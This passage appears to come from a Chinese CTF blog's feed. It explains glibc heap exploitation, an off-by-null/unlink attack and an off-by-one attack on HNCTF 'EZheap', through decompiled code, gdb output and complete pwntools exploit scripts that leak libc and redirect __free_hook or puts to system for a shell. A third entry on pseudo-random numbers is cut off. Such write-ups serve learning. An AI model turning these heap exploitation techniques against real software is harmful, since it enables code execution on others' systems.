<p>然后再通过改写__free_hook为system来getshell。</p>
<p>首先是去泄露libc基地址。还是先去填满tcache bins。由于这里不存在uaf的漏洞。所以我们可以通过先将一个较大的堆块释放到unsorted bin管理。再对半砍。此时前半的user data会被写入fd和bk。也就是main_arena的真实地址。那么也就做到了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x250</span>) <span class="comment">#0~8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment">#0~7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x250</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#8 这里是为了清空unsorted bin，恢复堆环境</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ebef0</span></span><br></pre></td></tr></table></figure>

<p>而这也就仅仅只是第一步。后面就开始了我们精心计算的环节。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x1f0</span>) <span class="comment">#0x200-0x10=0x1f0</span></span><br><span class="line">add (<span class="number">0x108</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#10  avoid top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment"># 0~7</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x100</span>+p16(<span class="number">0x310</span>))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x121</span>)) <span class="comment">#0x210+0x110-0x200=0x120 (P=1)</span></span><br></pre></td></tr></table></figure>

<p>这里先是把我们之前申请的chunk给全部释放。然后去申请了大小为0x200的chunk去填满tcache bins。注意，此时idx &#x3D; 7的chunk会被分配到unsorted bin中。这是我们后面计算的一个要点。</p>
<p>然后我们又去申请了三个chunk。其中chunk 8是为了unlink利用。chunk 9是为了off by bull利用。chunk 10则是为了防止合并。</p>
<p>首先我们要知道在64位程序下，我们申请的chunk会按照16字节对齐。也就是说当我们申请0x200和0x208大小的chunk时，实际上系统都会给我们分配0x210大小的chunk。而申请0x208也是我们进行off by null的关键。不然当我们申请0x200大小的chunk会有8字节是我们无法写入的，也就是浪费的。也改不了chunk 9的标志位，没有了unlink可以利用。</p>
<p>其次，这里的三次edit也很关键。</p>
<p>第一次把chunk 8填满。也就是这里修改chunk 9标志位的关键。可以看下现在chunk 9的size应该为0x200。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x55555555d6c0:	0x0000000000000310	0x0000000000000200</span><br></pre></td></tr></table></figure>

<p>而这里的0x310也是我们改写的。</p>
<p>首先由于内存分配管理的问题<code>0x55555555d6c0</code>为首地址的8字节不仅是9的pre_size位，也是8的user_data。也就是说，当我们去unlink的时候，系统会根据chunk 9（freed）的pre_size去找堆块。那这里为什么是0x310呢？</p>
<p>还记得我们之前的idx &#x3D; 7的chunk吗？加上header大小是0x200。chunk 8加上header的大小是0x110。0x200+0x110 &#x3D; 0x310。也就是说7 ，8 ，9三个chunk会一块合并。合并成一个0x200 + 0x110 + 0x200 &#x3D; 0x510的巨大chunk。那么此时free 9后就会归类在unsorted bin中。但是8没有被free。我们可以合法访问。简直不要太神奇。</p>
<p>这里第三次edit是为什么呢？</p>
<p>由于我们free 9的时候，系统不仅会向前合并，还会向后合并。也就是说系统会去检查chunk 10的标志位是否为0。所以这个时候我们需要自己来伪造一个header来让系统了解，这里的标志位为1，然后放松对我们unlink的检查。</p>
<p>至于大小为什么是0x120呢？</p>
<p>是因为我们chunk 9的原本的大小是0x210,chunk 10是0x110。那么距离top chunk的大小是0x210 + 0x110 &#x3D; 0x320。但是根据我们off by null的改变后，chunk 9 size &#x3D; 0x200，此时距离chunk 10 实际距离top chunk就应该等于0x320 - 0x200 &#x3D; 0x120。至于这里padding的长度则是由0x208 - 0x10 &#x3D; 0x1f8得到的。</p>
<p>当我们完成上面的布局后。去free 9 。此时就会得到一个0x510大小的chunk。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d3b0</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line">fd: 0x7ffff7bebca0</span><br><span class="line">bk: 0x7ffff7bebca0</span><br></pre></td></tr></table></figure>

<p>下面就是unlink的打法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">debug()</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#7 + 8 =0x310 idx = 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(free_hook)) <span class="comment">#8 fd = free_hook</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(sys))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>通过free堆块来使count++。然后我们去申请了一个大小为0x300的chunk。还记得被困在7和9之间的chunk 8 吗？这里的目的就是去改8的fd为free_hook，也就是类似uaf的手法。后面就不过多赘述了。</p>
<p>下面给出完整的exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,25551)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x250</span>) <span class="comment">#0~8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment">#0~7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x250</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x120</span>) <span class="comment">#8</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x3ebef0</span></span><br><span class="line">free_hook = base + libc.sym.__free_hook</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x1f0</span>) <span class="comment">#0x200-0x10=0x1f0</span></span><br><span class="line">add (<span class="number">0x108</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#10  avoid top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i) <span class="comment"># 0~7</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;\x11&#x27;</span>*<span class="number">0x100</span>+p16(<span class="number">0x310</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x121</span>)) <span class="comment">#0x210+0x110-0x200=0x120 (P=1)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">debug()</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#7 + 8 =0x310 idx = 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x200</span>+p64(free_hook)) <span class="comment">#8 fd = free_hook</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(sys))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>off_by_one</title>
    <url>/2026/02/19/off-by-one/</url>
    <content><![CDATA[<h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a><code>off-by-one</code></h2><p>off-by-one是指<code>单字节缓冲区溢出</code>其实不仅在堆里出现，在栈上也是一种可以利用的漏洞。不过在这里就仅仅考虑在堆上的利用。</p>
<h4 id="1-HNCTF-2022-WEEK4-EZheap"><a href="#1-HNCTF-2022-WEEK4-EZheap" class="headerlink" title="1.[HNCTF 2022 WEEK4] EZheap"></a><code>1.[HNCTF 2022 WEEK4] EZheap</code></h4><p>[<a href="https://www.nssctf.cn/problem/3104">HNCTF 2022 WEEK4]ezheap | NSSCTF</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_env(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy Note.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      n4 = getnum();</span><br><span class="line">      <span class="keyword">if</span> ( n4 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n4 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( n4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是很熟悉的菜单。不过此时这里的delete函数是无法利用的。也就是在这里将free掉的堆块都赋0了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_QWORD *<span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *heaplist; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt;= <span class="number">0x10</span> &amp;&amp; *(_DWORD *)(heaplist[n0x10] + <span class="number">24LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(heaplist[n0x10] + <span class="number">16LL</span>));</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)heaplist[n0x10]);</span><br><span class="line">    sizelist[n0x10] = <span class="number">0LL</span>;</span><br><span class="line">    *(_DWORD *)(heaplist[n0x10] + <span class="number">24LL</span>) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)(heaplist[n0x10] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    heaplist = heaplist;</span><br><span class="line">    heaplist[n0x10] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> heaplist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出的是add()函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  v3 = getnum();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    heaplist[v3] = <span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !heaplist[v3] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = heaplist[v3];</span><br><span class="line">    *(_QWORD *)(v0 + <span class="number">16</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">    *(_QWORD *)(heaplist[v3] + <span class="number">32LL</span>) = &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_QWORD *)(heaplist[v3] + <span class="number">16LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sizelist[v3] = size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Name: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, (<span class="type">void</span> *)heaplist[v3], <span class="number">0x10u</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[v3] + <span class="number">16LL</span>), sizelist[v3]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    v1 = heaplist[v3];</span><br><span class="line">    *(_DWORD *)(v1 + <span class="number">24</span>) = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出add()也是建立了两个chunk。一个0x20的struct chunk(sc)，另一个是我们控制大小的content chunk</p>
<p>(cc)。然后在sc里放了puts的真实地址。（由于延迟链接的问题，所以在前面调用了puts的情况下，这里就会直接变成puts的真实地址，而不是got表地址，所以接收到就可以了。）所以我们可以泄露出，然后就获得libc的基地址。后面又会在cc里读入我们输入的内容。</p>
<p><img src="/images/heap3.png" alt="gdb"></p>
<p>可以看的出来，<code>0x55555555b020</code>处存着指向我们写入数据的指针，而下面也放着puts的地址。通过show()函数，我们可以知道，当我们调用show函数的时候，我们写入的数据会编程puts的参数，然后输出。所以如果我们劫持puts函数为system函数，再把我们写入的&#x2F;bin&#x2F;sh当作参数，就可以getshell了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt; <span class="number">0x10</span> &amp;&amp; heaplist[n0x10] )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(heaplist[n0x10] + <span class="number">32LL</span>))(heaplist[n0x10]);</span><br><span class="line">    <span class="keyword">return</span> (*(__int64 (__fastcall **)(_QWORD))(heaplist[n0x10] + <span class="number">32LL</span>))(*(_QWORD *)(heaplist[n0x10] + <span class="number">16LL</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那我们该怎么利用呢？这里就要用到edit函数了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x10; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your idx:&quot;</span>);</span><br><span class="line">  n0x10 = getnum();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  nbytes = getnum();</span><br><span class="line">  <span class="keyword">if</span> ( n0x10 &lt;= <span class="number">0x10</span> &amp;&amp; heaplist[n0x10] &amp;&amp; nbytes &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *(<span class="type">void</span> **)(heaplist[n0x10] + <span class="number">16LL</span>), nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Error idx!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数做的事情是，把指定下标的堆块的大小进行改变，前提是不大于0x100。这里就存在漏洞了。如果我们申请两个的堆块。由于堆块是连起来的，所以我们可以对idx&#x3D;0的堆块的大小进行改变，将0cc变大，然后就可以在0cc输入数据的时候覆盖idx&#x3D;1的堆块的数据。最后再调用1堆块就可以实现改写puts–&gt;system。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29080)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,name,content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x31</span>,pl1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line"><span class="comment">#binsh = base + next(libc.search(&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(sys)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x48</span>,pl2)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看出来我们这里对edit去改变堆块的大小是有讲究的，第一次为什么大小修改为0x31，这里的b’\x80’又是什么呢？</p>
<p>其实可以看出来，第一次是为了泄露出puts的地址，而这里的0x80则是off-by-one的做法。覆盖最低位的那个字节。是idx&#x3D;1的指向内容的指针指向了puts的地址，那么下次puts的内容就是puts的地址了。</p>
<p><img src="/images/heap4.png" alt="gdb"></p>
<p>可以看出1的指向cc的指针变成了指向puts的地址，同时由于我们0cc的输入地址是在<code>0x55555555b040</code>,而需要修改的位置是在<code>0x55555555b070</code>所以刚好是0x30+b’\x80’&#x3D;0x31的大小。后面的第二次的修改就和第一次的修改原理是一样了。关键是需要通过gdb逐步调试跟进。</p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>random</title>
    <url>/2025/12/16/random/</url>
    <content><![CDATA[<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>之前一直遇到随机数的题目，一直没有尝试，现在来记录一下新的一种解题方法，顺便加强一下Python能力。😁</p>
<p><img src="/images/random1.png" alt="ida"></p>
<p>可以看出来，这里基本上都是随机数，但是其实是伪随机，所以我们可以通过得到种子的值，来获得程序中的随机数。这里最主要的其实就是脚本的编写。</p>
<p>由于我们脚本是由python来写的，而程序使用C语言。所以这里引用ctypes库。</p>
